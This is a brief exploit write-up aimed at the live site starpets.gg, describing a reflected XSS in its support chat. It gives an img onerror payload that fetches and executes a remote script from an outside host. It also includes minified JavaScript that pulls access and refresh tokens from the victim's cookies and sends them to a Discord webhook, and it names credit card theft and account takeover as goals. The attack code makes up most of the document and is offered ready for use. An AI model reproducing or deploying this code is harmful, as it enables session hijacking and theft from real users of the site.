### website: https://starpets.gg
#### Vulnibity: XSS Reflected 

**What can this exploit do?0**

- lets attackers steal access tokens
- inject JS in to page
- steal creditcards when entered
- spoof website

**Where?**
In support chat. Victim will send the payload in the chat and JS will be injected

**xss injection**
```html
<img src="" onerror="YOUR SCRIPT" />
```

**Proof of work**
```html
<img src="" onerror="fetch('https://badcode.com/script.js').then(response => response.text()).then(script => new Function(script)());"/>
```
the following shows how to inject a remote javascript file on the website.

**Proof of concept**
using the proof of work if the attacker wants to steal a starpets account he must use the following JS script to be loaded 

```js
function getCookiesMap(e){return e.split(";").map(function(e){return e.trim().split("=")}).reduce(function(e,n){return e[n[0]]=n[1],e},{})}function tokens(){let e=getCookiesMap(document.cookie);if(!e.hasOwnProperty("access-token")||!e.hasOwnProperty("refresh-token"))return[void 0,void 0];let n=e["access-token"],t=e["refresh-token"];return{accessToken:n,refreshToken:t}}async function leet(e,n,t){try{await fetch(e,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:null,embeds:[{title:"1337 made by NTX, Camel and Luke!",color:0,fields:[{name:"Access Token",value:"```\n"+n+"\n```"},{name:"Refresh Token",value:"```\n"+t+"\n```"}]}],attachments:[]})})}catch(o){console.error("Error sending message:",o)}}const{accessToken:e,refreshToken:n}=tokens();leet(atob("YOUR BASE 64 DISCORD WEBHOOK"),e,n);
```
